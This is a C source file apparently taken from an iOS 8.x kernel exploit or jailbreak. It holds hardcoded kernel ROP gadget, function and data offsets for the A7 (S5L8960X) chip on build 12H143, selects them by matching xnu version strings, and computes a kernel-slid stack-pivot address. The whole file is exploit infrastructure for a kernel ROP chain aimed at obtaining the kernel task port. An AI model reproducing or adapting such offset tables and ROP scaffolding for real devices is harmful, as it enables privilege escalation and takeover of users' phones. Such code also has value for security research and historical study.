#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

#include <common.h>
#include <kslide.h>
#include <plog.h>
#include <offsets.h>

static addr_t vtab = 0;

addr_t* offsets = NULL;

/* 8.4 */
static addr_t S5L8960X_12H143[] =
{   // n51
    /*---- unslide ----*/
    // kslide
    0xffffff8002542000, // ANCHOR
    // rop gadgets
    0x0000000000000120, // OSUnserializeXML_stack
    0x0000000000000120, // is_io_service_open_extended_stack
    0x0000000000000288, // task_itk_space
    0x00000000000000e8, // task_itk_self
    
    /*---- slide ----*/
    // rop gadgets
    0xffffff8002dbc81c, // gadget_ldp_x9_add_sp_sp_0x10
    0xffffff80020c3664, // gadget_ldr_x0_sp_0x20_load_x22_x19
    0xffffff80020be568, // gadget_add_x0_x0_x19_load_x20_x19
    0xffffff80020214cc, // gadget_str_x0_x19_load_x20_x19
    0xffffff8002004f18, // gadget_load_x20_x19
    0xffffff8002edb128, // gadget_blr_x20_load_x22_x19
    0xffffff80023bacc0, // gadget_ldr_x0_x21_0x5c8_load_x24_x19
    0xffffff80023a8e54, // gadget_OSUnserializeXML_return
    // functions
    0xffffff8002042fd8, // func_current_task
    0xffffff8002016f6c, // func_ipc_port_make_send
    0xffffff8002017058, // func_ipc_port_copyout_send
    0xffffff80020f76f0, // func_ldr_x0_x0
    // frag
    0xffffff800298f7a8, // frag_mov_x1_x20_blr_x21
    // data
    0xffffff8002542010, // data_kernel_task
};

bool offsets_initialize(void)
{
    static bool init = false;
    
    if(!init)
    {
        uint16_t cpid = 0;
        struct utsname u = {};
        uname(&u);
        
        offsets = NULL;
        
        LOG("kern.version: %s", u.version);
        
        if(strstr(u.version, "S5L8960X") != NULL) cpid = 0x8960;
        else                                      cpid = 0x0000;
        
        if(cpid)
        {
            if(strstr(u.version, "xnu-2784.40.6~18") != NULL)
            {
                /* 8.4.1: 12H321 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2784.30.7~30") != NULL)
            {
                /* 8.4: 12H143 */
                if((cpid & 0xFFF0) == 0x8960) offsets = S5L8960X_12H143;
            }
            else if(strstr(u.version, "xnu-2784.20.34~2") != NULL)
            {
                /* 8.3: 12F69 */
                /* 8.3: 12F70 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2783.5.38~5") != NULL)
            {
                /* 8.2: 12D508 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2783.3.26~3") != NULL)
            {
                /* 8.1.3: 12B466 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2783.3.22~1") != NULL)
            {
                /* 8.1.1: 12B435 */
                /* 8.1.2: 12B440 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2783.3.13~4") != NULL)
            {
                /* 8.1: 12B410 */
                /* 8.1: 12B411 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2783.1.72~23") != NULL)
            {
                /* 8.0.1: 12A402 */
                /* 8.0.2: 12A405 */
                // TODO
            }
            else if(strstr(u.version, "xnu-2783.1.72~8") != NULL)
            {
                /* 8.0: 12A365 */
                // TODO
            }
            else
            {
                ERR("unsupported version");
                offsets = NULL;
            }
        }
        
        if(offsets != NULL) init = true;
    }
    
    return init;
}

addr_t koffset(enum koffsets offset)
{
    if (!offsets_initialize())
    {
        return 0;
    }
    
    if (offsets == NULL)
    {
        return 0;
    }
    
    return offsets[offset];
}

static addr_t offset_stack_pivot(void)
{
    return koffset(gadget_ldp_x9_add_sp_sp_0x10);
}

addr_t get_stack_pivot(void)
{
    static addr_t stack_pivot = 0;
    if(stack_pivot == 0)
    {
        stack_pivot = offset_stack_pivot();
        DEVLOG("got stack_pivot (unslid): " ADDR, vtab);
        stack_pivot += get_kernel_slide();
    }
    return stack_pivot;
}

